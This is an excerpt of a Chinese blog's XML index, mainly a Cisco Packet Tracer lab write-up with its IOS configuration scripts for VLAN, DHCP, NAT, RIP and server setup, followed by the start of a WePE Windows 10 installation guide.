href="https://blog.csdn.net/qq_34206560/article/details/83242664" target="_blank" rel="noopener">古典密码集合</a></p>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Packet Tracer网络模拟实验实记</title>
      <link href="/2020/08/29/packet-tracer-wang-luo-mo-ni-shi-yan-shi-ji/"/>
      <url>/2020/08/29/packet-tracer-wang-luo-mo-ni-shi-yan-shi-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h1><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/实验要求网络拓扑.png" alt="实验要求网络拓扑"></center><h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p><strong>分配的IP地址：</strong></p><ul><li><p>LAN1分配地址段为202.196.1.0/24，LAN1PC1和LAN1PC2属于vlan 10，LAN1PC3和LAN1PC4属于vlan 20</p></li><li><p>LAN2分配私有地址段:192.168.1.0/24</p></li><li><p>LAN3分配外部地址段:202.196.2.0/24</p></li></ul><p><strong>各个LAN配置要求：</strong> </p><ul><li>在LAN1中完成地址动态分配，LAN1PC1，LAN1PC2，LAN1PC3，LAN1PC4能够互相访问</li><li>在LAN2中完成NAT，使其中的计算机能够把地址转换成公网IP访问外面网络</li><li>在LAN3中配置LAN3Server服务器，为全网络提供Web服务，并配置DNS，网络中所有计算机可以通过域名访问该网站；配置FTP服务，全网计算机可使用该服务</li><li>路由器之间运行RIP协议生成动态路由</li><li>使LAN2中的计算机可以ping通外面的计算机，外面的计算机不能够ping通里面的机器，以达到保护LAN2中计算机不受外面攻击（实现方案不限）</li></ul><h1 id="技术分析"><a href="#技术分析" class="headerlink" title="技术分析"></a>技术分析</h1><ul><li>VLAN配置</li><li>VLAN间通信</li><li>DHCP配置</li><li>NAT技术</li><li>RIP路由配置</li><li>浮动路由配置</li><li>HTTP服务器配置</li><li>DNS服务器配置</li><li>FTP服务器配置</li></ul><h1 id="操作环境"><a href="#操作环境" class="headerlink" title="操作环境"></a>操作环境</h1><p>网络模拟器：</p><ul><li>Cisco Packet Tracer v7.0</li></ul><p>测试系统：</p><ul><li>Windows 10</li></ul><h1 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h1><ol><li><p>网络基础架构在Packet Tracer中复现，复现拓扑如图1所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/实验要求网络拓扑.png" alt="实验要求网络拓扑"></center><center>图1</center></li><li><p>IP地址分配及设备功能性标注，如图2所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/IP分配.png" alt="IP分配"></center><center>图2</center></li><li><p>在LAN1SW交换机中进行基于端口的VLAN配置操作，将LAN1PC1和LAN1PC2划分到VLAN10中，将LAN1PC3和LAN1PC4划分到VLAN20中，配置命令如图3所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN1SW1-VLAN配置.png" alt="LAN1SW1-VLAN配置"></center><center>图3</center></li><li><p>在R1路由器中配置DHCP服务，将202.196.1.2<del>202.196.1.127和202.196.1.130</del>202.196.1.254网段内的IP分别分配给VLAN10和VLAN20，配置命令如图4所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/R1-DHCP配置.png" alt="R1-DHCP配置"></center><center>图4</center><p>DHCP服务配置完成之后LAN1PC1和LAN1PC3通过DHCP获得的IP分别为图5和图6所示。</p></li></ol><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN1PC1-DHCP-IP.png" alt="LAN1PC1-DHCP-IP"></center><center>图5</center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN1PC3-DHCP-IP.png" alt="LAN1PC3-DHCP-IP"></center>   <center>图6</center><ol start="5"><li><p>在R1路由器的G0/0端口配置单臂路由，以实现VLAN10和VLAN20之间的通信，配置 命令如图7所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/R1-单臂路由配置.png" alt="R1-单臂路由配置"></center><center>图7</center><p>单臂路由配置完成之后，LAN1PC1和LAN1PC3之间的连通性如图8所示。</p></li></ol><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN1PC1-ping-LAN1PC3(单臂路由结果).png" alt="LAN1PC1-ping-LAN1PC3(单臂路由结果)"></center><center>图8</center><ol start="6"><li><p>配置R1路由器端口的IP地址，配置命令如图9所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/R1-IP配置.png" alt="R1-IP配置"></center><center>图9</center></li><li><p>配置R2路由器端口的IP地址，配置命令如图10所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/R2-IP配置.png" alt="R2-IP配置"></center><center>图10</center></li><li><p>在R2路由器上进行基于端口的NAT配置，使LAN2中的主机可以访问Internet，配置命令如图11所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/R2-NAT.png" alt="R2-NAT"></center><center>图11</center></li><li><p>配置R3路由器端口的IP地址，配置命令如图12所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/R3-IP.png" alt="R3-IP"></center><center>图12</center></li><li><p>在LAN3Server上配置Web服务</p></li></ol><ul><li>开启HTTP服务如图13所示</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN3Server-开启HTTP.png" alt="LAN3Server-开启HTTP"></center><center>图13</center><ul><li>编辑index.html页面如图14所示</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN3Server-HTTP-index.png" alt="LAN3Server-HTTP-index"></center><center>图14</center><ul><li>在LAN3PC1主机上测试Web服务器配置结果如图15所示</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN3PC1-IP-WebServer.png" alt="LAN3PC1-IP-WebServer"></center><center>图15</center><ol start="11"><li>在LAN3Server上配置DNS服务</li></ol><ul><li>开启DNS服务并为LAN3Server的HTTP服务配置一天记录，如图16所示</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN3Server-DNS.png" alt="LAN3Server-DNS"></center><center>图16</center><ul><li>在LAN3PC1主机上测试DNS服务器的配置结果，如图17所示</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN3PC1-DNS-WebServer.png" alt="LAN3PC1-DNS-WebServer"></center><center>图17</center><ol start="12"><li>在LAN3Server上配置FTP服务</li></ol><ul><li>开启FTP服务并添加一个FTP用户，如图18所示</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN3Server-FTP.png" alt="LAN3Server-FTP"></center><center>图18</center><ul><li>在LAN3PC1主机上测试FTP服务的配置结果，如图19所示</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN3PC1-FTP.png" alt="LAN3PC1-FTP"></center><center>图19</center><ol start="13"><li>RIP动态路由配置。</li></ol><ul><li>R1路由器的RIP配置命令如图20所示</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/R1-RIP.png" alt="R1-RIP"></center><center>图20</center><ul><li>R2路由器的RIP配置命令如图21所示</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/R2-RIP.png" alt="R2-RIP"></center><center>图21</center><ul><li>R3路由器的RIP配置命令如图22所示</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/R3-RIP.png" alt="R3-RIP"></center><center>图22</center><ul><li>RIP配置完成之后LAN3PC2主机去pingLAN2PC1主机，测试结果如图23所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN3PC2-ping-LAN2PC1.png" alt="LAN3PC2-ping-LAN2PC1"></center><center>图23</center><p><font color="red">LAN3内部主机可以ping通LAN2内部主机，在配置RIP时把私有IP当作共有IP来使用了，这个结果也不满足实验的要求，所以需要进行第14条操作。</font></p><ol start="14"><li>在R2路由器上配置浮动路由，在配置浮动路由之前需要把之前多余的RIP配置删除掉。</li></ol><ul><li>在R2上删除多余的RIP配置，操作命令如图24所示</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/R2-Del-RIP.png" alt="R2-Del-RIP"></center><center>图24</center><ul><li>清除路由器的路由缓存，操作命令如图25所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/R-ClearRouteCache.png" alt="R-ClearRouteCache"></center><center>图25</center><ul><li>在R2上配置浮动路由，配置命令如图26所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/R2-IP-Route.png" alt="R2-IP-Route"></center><center>图26</center><h1 id="操作结果"><a href="#操作结果" class="headerlink" title="操作结果"></a>操作结果</h1><ul><li>LAN1PC2与LAN1PC4的连通性测试结果如图27所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN1PC2-ping-LAN1PC4.png" alt="LAN1PC2-ping-LAN1PC4"></center><center>图27</center><ul><li>LAN1PC2与LAN2PC1的连通性测试结果如图28所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN1PC2-ping-LAN2PC1.png" alt="LAN1PC2-ping-LAN2PC1"></center><center>图28</center><ul><li>LAN1PC2访问WebServer测试结果如图29所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN1PC2-WebServer.png" alt="LAN1PC2-WebServer"></center><center>图29</center><ul><li>LAN2PC1与LAN1PC1的连通性测试结果如图30所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN2PC1-ping-LAN1PPC1.png" alt="LAN2PC1-ping-LAN1PPC1"></center><center>图30</center><ul><li>LAN2PC1与LAN3PC 1的连通性测试结果如图31所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN2PC1-ping-LAN3PC1.png" alt="LAN2PC1-ping-LAN3PC1"></center><center>图31</center><ul><li>LAN2PC1到LAN3PC1的ping测试中，R2到R3时截获的ICMP报文如图32所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/R2-R3-ICMP.png" alt="R2-R3-ICMP"></center><center>图32</center><ul><li>LAN2PC1访问WebServer测试结果如图33所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN2PC1-WebServer.png" alt="LAN2PC1-WebServer"></center><center>图33</center><ul><li>LAN3PC1与LAN1PC3的连通性测试结果如图34所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN3PC1-ping-LAN1PC3.png" alt="LAN3PC1-ping-LAN1PC3"></center><center>图34</center><ul><li>LAN3PC1与LAN2PC1的连通性测试结果如图35所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN3PC1-ping-LAN2PC1.png" alt="LAN3PC1-ping-LAN2PC1"></center><center>图35</center><ul><li>LAN1PC1访问FTPServer测试结果如图36所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN1PC1-FTPServer.png" alt="LAN1PC1-FTPServer"></center><center>图36</center><ul><li>LAN2PC4访问FTPServer测试结果如图37所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN2PC4-FTPServer.png" alt="LAN2PC4-FTPServer"></center><center>图37</center><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="配置命令脚本"><a href="#配置命令脚本" class="headerlink" title="配置命令脚本"></a>配置命令脚本</h2><p>LAN1部分配置：</p><ul><li><p>LAN1SW上的VLAN配置</p><pre class=" language-sql"><code class="language-sql">enconf thostname LAN1SWvlan <span class="token number">10</span>vlan <span class="token number">20</span><span class="token keyword">int</span> range <span class="token number">f0</span><span class="token operator">/</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">10</span>switchport mode accessswitchport access vlan <span class="token number">10</span><span class="token keyword">int</span> range <span class="token number">f0</span><span class="token operator">/</span><span class="token number">11</span><span class="token operator">-</span><span class="token number">20</span>switchport mode accessswitchport access vlan <span class="token number">20</span><span class="token keyword">int</span> g0<span class="token operator">/</span><span class="token number">1</span>switchport mode trunkswitchport trunk allowed vlan <span class="token keyword">all</span><span class="token keyword">end</span></code></pre></li></ul><ul><li><p>R1上的DHCP配置</p><pre class=" language-sql"><code class="language-sql">enconf thostname R1ip dhcp excluded<span class="token operator">-</span>address <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">1.1</span> ip dhcp excluded<span class="token operator">-</span>address <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">1.129</span>ip dhcp pool vlan10 network <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">1.0</span> <span class="token number">255.255</span><span class="token punctuation">.</span><span class="token number">255.128</span><span class="token keyword">default</span><span class="token operator">-</span>router <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">1.1</span>dns<span class="token operator">-</span>server <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">2.250</span>exip dhcp pool vlan20network <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">1.128</span> <span class="token number">255.255</span><span class="token punctuation">.</span><span class="token number">255.128</span><span class="token keyword">default</span><span class="token operator">-</span>router <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">1.129</span> dns<span class="token operator">-</span>server <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">2.250</span><span class="token keyword">end</span></code></pre></li></ul><ul><li><p>R1上的单臂路由配置</p><pre class=" language-sql"><code class="language-sql">enconf t<span class="token keyword">int</span> g0<span class="token operator">/</span><span class="token number">0.1</span> encapsulation dot1Q <span class="token number">10</span>ip <span class="token keyword">add</span> <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">1.1</span> <span class="token number">255.255</span><span class="token punctuation">.</span><span class="token number">255.128</span><span class="token keyword">int</span> g0<span class="token operator">/</span><span class="token number">0.2</span>encapsulation dot1Q <span class="token number">20</span>ip <span class="token keyword">add</span> <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">1.129</span> <span class="token number">255.255</span><span class="token punctuation">.</span><span class="token number">255.128</span><span class="token keyword">int</span> g0<span class="token operator">/</span><span class="token number">0</span><span class="token keyword">no</span> shut<span class="token keyword">end</span></code></pre></li></ul><ul><li><p>R1其他端口IP配置</p><pre class=" language-sql"><code class="language-sql">enconf t<span class="token keyword">int</span> s0<span class="token operator">/</span><span class="token number">0</span><span class="token operator">/</span><span class="token number">0</span>ip <span class="token keyword">add</span> <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">3.2</span> <span class="token number">255.255</span><span class="token punctuation">.</span><span class="token number">255.0</span><span class="token keyword">no</span> shut<span class="token keyword">int</span> s0<span class="token operator">/</span><span class="token number">0</span><span class="token operator">/</span><span class="token number">1</span>ip <span class="token keyword">add</span> <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">5.1</span> <span class="token number">255.255</span><span class="token punctuation">.</span><span class="token number">255.0</span>clock rate <span class="token number">64000</span><span class="token keyword">no</span> shut<span class="token keyword">end</span></code></pre></li></ul><p>LAN2部分配置：</p><ul><li><p>R2上的IP配置</p><pre class=" language-sql"><code class="language-sql">enconf thostname R2<span class="token keyword">int</span> g0<span class="token operator">/</span><span class="token number">0</span>ip <span class="token keyword">add</span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">1.1</span> <span class="token number">255.255</span><span class="token punctuation">.</span><span class="token number">255.0</span><span class="token keyword">no</span> shut<span class="token keyword">int</span> s0<span class="token operator">/</span><span class="token number">0</span><span class="token operator">/</span><span class="token number">1</span>ip <span class="token keyword">add</span> <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">5.2</span> <span class="token number">255.255</span><span class="token punctuation">.</span><span class="token number">255.0</span><span class="token keyword">no</span> shut<span class="token keyword">int</span> s0<span class="token operator">/</span><span class="token number">0</span><span class="token operator">/</span><span class="token number">0</span>ip <span class="token keyword">add</span> <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">4.2</span> <span class="token number">255.255</span><span class="token punctuation">.</span><span class="token number">255.0</span><span class="token keyword">no</span> shut<span class="token keyword">end</span></code></pre></li></ul><ul><li><p>R2上的NAT配置</p><pre class=" language-sql"><code class="language-sql">enconf taccess<span class="token operator">-</span>list <span class="token number">1</span> permit <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">1.0</span> <span class="token number">0.0</span><span class="token punctuation">.</span><span class="token number">0.255</span> ip nat inside source list <span class="token number">1</span> <span class="token keyword">int</span> s0<span class="token operator">/</span><span class="token number">0</span><span class="token operator">/</span><span class="token number">0</span> overloadip nat inside source list <span class="token number">1</span> <span class="token keyword">int</span> s0<span class="token operator">/</span><span class="token number">0</span><span class="token operator">/</span><span class="token number">1</span> overload<span class="token keyword">int</span> g0<span class="token operator">/</span><span class="token number">0</span>ip nat inside<span class="token keyword">int</span> s0<span class="token operator">/</span><span class="token number">0</span><span class="token operator">/</span><span class="token number">0</span>ip nat outside<span class="token keyword">int</span> s0<span class="token operator">/</span><span class="token number">0</span><span class="token operator">/</span><span class="token number">1</span>ip nat outside<span class="token keyword">end</span></code></pre></li></ul><ul><li><p>R2上的浮动路由配置</p><pre class=" language-sql"><code class="language-sql">enconf tip route <span class="token number">0.0</span><span class="token punctuation">.</span><span class="token number">0.0</span> <span class="token number">0.0</span><span class="token punctuation">.</span><span class="token number">0.0</span> <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">4.1</span>ip route <span class="token number">0.0</span><span class="token punctuation">.</span><span class="token number">0.0</span> <span class="token number">0.0</span><span class="token punctuation">.</span><span class="token number">0.0</span> <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">5.1</span> <span class="token number">10</span><span class="token keyword">end</span></code></pre></li></ul><p>LAN3部分配置：</p><ul><li><p>R3上的IP配置</p><pre class=" language-sql"><code class="language-sql">enconf thostname R3<span class="token keyword">int</span> g0<span class="token operator">/</span><span class="token number">0</span>ip <span class="token keyword">add</span> <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">2.1</span> <span class="token number">255.255</span><span class="token punctuation">.</span><span class="token number">255.0</span><span class="token keyword">no</span> shut<span class="token keyword">int</span> s0<span class="token operator">/</span><span class="token number">0</span><span class="token operator">/</span><span class="token number">0</span>ip <span class="token keyword">add</span> <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">3.1</span> <span class="token number">255.255</span><span class="token punctuation">.</span><span class="token number">255.0</span>clock rate <span class="token number">64000</span><span class="token keyword">no</span> shut<span class="token keyword">int</span> s0<span class="token operator">/</span><span class="token number">0</span><span class="token operator">/</span><span class="token number">1</span>ip <span class="token keyword">add</span> <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">4.1</span> <span class="token number">255.255</span><span class="token punctuation">.</span><span class="token number">255.0</span>clock rate <span class="token number">64000</span><span class="token keyword">no</span> shut<span class="token keyword">end</span></code></pre></li></ul><p>全局RIP配置：</p><ul><li><p>R1的RIP配置</p><pre class=" language-sql"><code class="language-sql">enconf troute ripnetwork <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">1.0</span>network <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">3.0</span>network <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">5.0</span><span class="token keyword">end</span></code></pre></li></ul><ul><li><p>R2的RIP配置</p><pre class=" language-sql"><code class="language-sql">enconf troute ripnetwork <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">4.0</span>network <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">5.0</span><span class="token keyword">end</span></code></pre></li></ul><ul><li><p>R3的RIP配置</p><pre class=" language-sql"><code class="language-sql">enconf troute ripnetwork <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">2.0</span>network <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">3.0</span>network <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">4.0</span><span class="token keyword">end</span></code></pre></li></ul><h2 id="其他相关命令"><a href="#其他相关命令" class="headerlink" title="其他相关命令"></a>其他相关命令</h2><ul><li>[#]<font color="red">clear ip route *</font>：清除生成的路由表</li><li>[#]<font color="red">show run</font>：查看系统当前配置</li><li>[#]<font color="red">copy run start</font>：保存系统当前配置</li><li>[#]<font color="red">reload</font>：重启系统</li></ul><h2 id="操作思路"><a href="#操作思路" class="headerlink" title="操作思路"></a>操作思路</h2><pre class=" language-html"><code class="language-html">1、网络拓扑设计    -> 网络设备的放置    -> 网络设备的命名    -> IP地址的划分2、基础配置    -> PC的静态IP地址    -> Server的静态IP配置3、LAN1配置    -> LAN1SW配置：        -> 基于端口的VLAN配置：    -> 配置R1的DHCP功能    -> 单臂路由实现VLAN之间的通信    -> R1基本IP配置4、LAN2配置：    -> R2配置        -> 基本IP配置        -> 浮动路由配置        -> NAT配置        -> ACL配置（不适用ACL完成要求）5、LAN3配置：    -> LAN3Server配置：        -> 关闭无用服务            -> 关闭DHCP、DHCPv6、AAA、EMAIL、IoE、VM Management服务        -> 配置HTTP服务（重写网页信息）        -> 配置DNS服务        -> 配置FTP服务        -> PC端测试    -> R3基本IP配置6、RIP动态路由配置</code></pre><h2 id="网站文本"><a href="#网站文本" class="headerlink" title="网站文本"></a>网站文本</h2><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>The Bridge Keeper<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>There was once a bridge which spanned a large river. During most of the day the bridge sat with its length running up and down the river paralleled with the banks, allowing ships to pass thru freely on both sides of the bridge. But at certain times each day, a train would come along and the bridge would be turned sideways across the river, allowing a train to cross it.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>A switchman sat in a small shack on one side of the river where he operated the controls to turn the bridge and lock it into place as the train crossed. One evening as the switchman was waiting for the last train of the day to come, he looked off into the distance thru the dimming twilight and caught sight of the trainlights. He stepped to the control and waited until the train was within a prescribed distance when he was to turn the bridge. He turned the bridge into position, but, to his horror, he found the locking control did not work. If the bridge was not securely in position it would wobble back and forth at the ends when the train came onto it, causing the train to jump the track and go crashing into the river. This would be a passenger train with many people aboard. He left the bridge turned across the river, and hurried across the bridge to the other side of the river wher He would have to hold the lever back firmly as the train crossed. He could hear the rumble of the train now, and he took hold of the lever and leaned backward to apply his weight to it, locking the bridge. He kept applying the pressure to keep the mechanism locked. Many lives depended on this man's strength.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Then, coming across the bridge from the direction of his control shack, he heard a sound that made his blood run cold. "Daddy, where are you?" His four-year-old son was crossing the bridge to look for him. His first impulse was to cry out to the child, "Run! Run!" But the train was too close; the tiny legs would never make it across the bridge in time. The man almost left his lever to run and snatch up his son and carry him to safety. But he realized that he could not get back to the lever. Either the people on the train or his little son must die. He took a moment to make his decision.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>The train sped safely and swiftly on its way, and no one aboard was even aware of the tiny broken body thrown mercilessly into the river by the onrushing train. Nor were they aware of the pitiful figure of the sobbing man, still clinging tightly to the locking lever long after the train had passed. They did not see him walking home more slowly than he had ever walked: to tell his wife how their son had brutally died.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Now if you comprehend the emotions which went this man's heart, you can begin to understand the feelings of our Father in Heaven when He sacrificed His Son to bridge the gap between us and eternal life. Can there be any wonder that He caused the earth to tremble and the skies to darken when His Son died? How does He feel when we speed along thru life without giving a thought to what was done for us thru Jesus Christ?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 网络配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络基础 </tag>
            
            <tag> 网络配置 </tag>
            
            <tag> Cisco </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WePE Win10 安装</title>
      <link href="/2020/08/27/wepe-win10-an-zhuang/"/>
      <url>/2020/08/27/wepe-win10-an-zhuang/</url>
      
        <content type="html"><![CDATA[<h1 id="WePE-Win10-安装"><a href="#WePE-Win10-安装" class="headerlink" title="WePE Win10 安装"></a>WePE Win10 安装</h1><h2 id="安装须知"><a href="#安装须知" class="headerlink" title="安装须知"></a>安装须知</h2><ol><li>由于大部分新电脑支持UEFI启动，本文介绍UEFI+GPT安装Windows10 x64位系统方法</li><li>UEFI启动模式下，硬盘分区表必须是GPT；如果你要在Legacy模式下安装，硬盘分区表必须是MBR</li></ol><h2 id="安装准备"><a href="#安装准备" class="headerlink" title="安装准备"></a>安装准备</h2><ul><li>准备一个大容量的存储设备，用来转移重要的数据</li><li>使用一个8G或16G的U盘，制作一个<strong>WePE启动盘</strong></li><li>提前下载好系统的镜像并保存到启动盘中(启动盘以NTFS格式化)</li><li>准备Windows激活工具</li></ul><h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><h3 id="U盘启动设置"><a href="#U盘启动设置" class="headerlink" title="U盘启动设置"></a>U盘启动设置</h3><p>​        新式的主板中都会设置一个<strong>快捷启动</strong>的热键，不同的主板设置的启动热键不同，即使存在热键，有时也需要在BIOS中开启才能使用。但最基础的还是在BIOS中设置启动的顺序。不同类型的电脑进入BIOS的热键也不同，组装机的BIOS热键根据主板的不同而定，整机的热键依据品牌的不同而不同。下面列出一些组装机或品牌机的BIOS热键以供参考：  </p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WePE/各品牌电脑进入BIOS热键大全.png" alt="各品牌电脑进入BIOS热键大全"></center>  <p>​        进入BIOS之后一般是在<strong>【BOOT】</strong>选项卡下将<strong>U盘</strong>设置为首选启动项，<strong>F10</strong>保存并退出BIOS设置后，重启时会自动进入<strong>PE界面</strong>。  </p><p>(HASEE战神Z7M-KP7GT启动Boot Security后需要重启才能以F2热键进入BIOS，F7为选择启动项热键)</p><h3 id="分区操作"><a href="#分区操作" class="headerlink" title="分区操作"></a>分区操作</h3><h4 id="分区助手-无损"><a href="#分区助手-无损" class="headerlink" title="分区助手(无损)"></a>分区助手(无损)</h4><ul><li>格式化</li></ul><p>​        分区助手可以帮助对磁盘分区进行管理，如果不需要全盘重新分区，直接<strong>右键系统盘</strong>(一般是C盘)，选择<strong>【格式化】</strong>，然后就可以进入<strong>系统安装</strong>步骤即可。</p><ul><li>快速分区</li></ul><p>​        如果需要重新分区，<strong>右键磁盘</strong>(如果计算机中有多块硬盘注意你选择的硬盘)选择<strong>【快速分区】</strong>，然后再快速分区界面中设置<strong>分区数目、分区大小</strong>(第1个分区一般是系统盘，建议50GB以上)，选择磁盘的类型为<strong>GPT</strong>，分区对齐到2048扇区是4K对齐，4096扇区也是4K对齐，设置完成之后，点击<strong>【开始执行】</strong>，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WePE/分区助手-快速分区界面.png.jpg" alt="分区助手-快速分区界面.png"></center><ul><li>PS<ol><li>分区操作执行得很快；</li><li>在分区过程中如果C盘被占用，可通过<strong>【更改盘符】</strong>操作来修改占用盘符C得盘符。</li></ol></li></ul><h4 id="DiskGenius分区工具"><a href="#DiskGenius分区工具" class="headerlink" title="DiskGenius分区工具"></a>DiskGenius分区工具</h4><p>​        DiskGenius是另一款磁盘管理工具，可以对磁盘进行详细的管理与设置。</p><ul><li>快速分区</li></ul><p>​        选择<strong>【快速分区】</strong>，调整<strong>分区参数</strong>，选择<strong>GPT</strong>分区表类型，选择<strong>分区数目</strong>，在<strong>【高级设置】</strong>中更改<strong>分区大小</strong>并设置各个<strong>分区卷标</strong>，操作界面如下图所示。</p><center><img 